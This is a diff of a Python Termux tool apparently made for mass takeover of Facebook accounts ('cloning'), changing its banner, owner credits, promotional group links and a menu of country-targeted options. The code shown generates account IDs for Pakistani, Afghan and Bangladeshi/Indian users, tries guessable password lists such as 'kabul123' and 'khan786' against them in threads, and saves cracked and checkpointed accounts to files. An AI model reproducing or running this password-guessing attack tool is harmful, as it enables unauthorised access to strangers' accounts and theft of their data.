@@ -7,7 +7,7 @@ from pathlib import Path
 import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
 #os.system('pip uninstall requests')
 #os.system('pip install requests')
-os.system('xdg-open https://www.facebook.com/duliako/')
+os.system('xdg-open https://facebook.com/groups/1245912839659325/')
 print('\n [√] Wait Installing Modules...!')
 #os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
 print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
@@ -161,27 +161,20 @@ except:
 oks=[]
 cps=[]
 loop=0
-logo=(f"\033[1;37m
-\033[1;39m======================================================
-\033[1;31m    ____   ____   ___    __ __________ ________    
-\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
-\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
-\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
-\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
-\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
-\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
-\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
-\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
-\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
-\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_ 
-\033[1;39m======================================================
-\033[1;32m  • \033[1;37m Tool Owner :-  𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎
-\033[1;32m  • \033[1;37m GitHub     :-  𝐇𝐀𝐂𝐊𝐄𝐑 𝐃𝐀 𝐓𝐄𝐑𝐌𝐔𝐗
+logo=(f"""\033[1;37m
+ db    db d88888b d8b   db  .d88b.  .88b  d88. 
+ 88    88 88'     888o  88 .8P  Y8. 88'YbdP`88 
+\033[1;32m Y8    8P 88ooooo 88V8o 88 88    88 88  88  88 
+\033[1;32m `8b  d8' 88~~~~~ 88 V8o88 88    88 88  88  88 
+\033[1;37m  `8bd8'  88.     88  V888 `8b  d8' 88  88  88 
+    YP    Y88888P VP   V8P  `Y88P'  YP  YP  YP  
+════════════════════════════════════════════════
+\033[1;32m  • \033[1;37m Tool Owner :-  Usman X Kazama
+\033[1;32m  • \033[1;37m GitHub     :-  JOKER-786
 \033[1;32m  • \033[1;37m Type       :-  Free
-\033[1;32m  • \033[1;37m Version    :-  {version}1.0
-\033[1;39m======================================================")
+\033[1;32m  • \033[1;37m Version    :-  {version}""")
 os.system('clear')
-#print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://www.facebook.com/duliako/')
+#print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://facebook.com/groups/1245912839659325/')
 
 ######## CLEAR #######
 
@@ -198,11 +191,11 @@ def line():print(48*'\033[1;37m═')
 
 def Main_JOKER():
         clear()
-        print(" [\033[1;32m1\033[97;1m] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐍𝐈𝐍𝐆")
-        print(" [\033[1;32m2\033[97;1m] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐍𝐈𝐍𝐆")
-        print(" [\033[1;32m3\033[97;1m] 𝐉𝐎𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 ")
-        print(" [\033[1;32m4\033[97;1m] 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐀𝐃𝐌𝐈𝐍")
-        print(" [\033[1;32m0\033[97;1m] \033[1;31m𝐄𝐗𝐈𝐓 𝐓𝐎𝐎𝐋")
+        print(" [\033[1;32m1\033[97;1m] FILE CLONING")
+        print(" [\033[1;32m2\033[97;1m] RANDOM CLONING")
+        print(" [\033[1;32m3\033[97;1m] JOIN GROUP ")
+        print(" [\033[1;32m4\033[97;1m] CONTACT ADMIN")
+        print(" [\033[1;32m0\033[97;1m] \033[1;31mEXIT TOOL")
         line()
  
         opt1 = input(" [•] Choose : ")
@@ -210,7 +203,7 @@ def Main_JOKER():
         
         elif opt1 == "2":
             clear()
-            print(' [\033[1;32m1\033[97;1m] 𝐏𝐀𝐊 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐍𝐈𝐍𝐆');print(' [\033[1;32m2\033[97;1m] 𝐀𝐅𝐆 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐍𝐈𝐍𝐆');print(' [\033[1;32m3\033[97;1m] 𝐁𝐄𝐍𝐆𝐋𝐀 + 𝐋𝐍𝐃 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐍𝐈𝐍𝐆');print(' [\033[1;32m5\033[97;1m] 𝐄𝐌𝐀𝐈𝐋 𝐂𝐋𝐍𝐈𝐍𝐆');print(' [\033[1;32m0\033[97;1m] \033[1;31m𝐁𝐀𝐂𝐊 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔');line()
+            print(' [\033[1;32m1\033[97;1m] Pakistan Random Cloning');print(' [\033[1;32m2\033[97;1m] Afg Random Cloning');print(' [\033[1;32m3\033[97;1m] Bengla + Ind Random Cloning');print(' [\033[1;32m5\033[97;1m] Email Cloning');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
             opt = input(' [•] Choose : ')
             if opt == '1':pak()
             if opt == '2':afg()
@@ -228,8 +221,8 @@ def Main_JOKER():
         elif opt1 == "3":
             clear();print(' [\033[1;32m1\033[97;1m] Join WhatsApp Group');print(' [\033[1;32m2\033[97;1m] Join Facebook Group');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
             d=input(' [•] Choose : ')
-            if d == '1':os.system('xdg-open https://chat.whatsapp.com/+93707266012');Main_JOKER()
-            if d == '2':os.system('xdg-open https://www.facebook.com/duliako/');Main_JOKER()
+            if d == '1':os.system('xdg-open https://chat.whatsapp.com/HEhfeaajh1IITDiVpyJI7z');Main_JOKER()
+            if d == '2':os.system('xdg-open https://facebook.com/groups/1245912839659325/');Main_JOKER()
             if d == '0':Main_JOKER()
             else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_JOKER()
  
@@ -348,7 +341,7 @@ def afg():
                         for psx in user:
  
                                 ids = code+psx
-                                passlist = [psx,ids,'afghan100200','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                 JOKER.submit(rd1,ids,passlist)
                 print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/JOKER/JOKER-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/JOKER/JOKER-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python JOKER_KHAN.py')
 
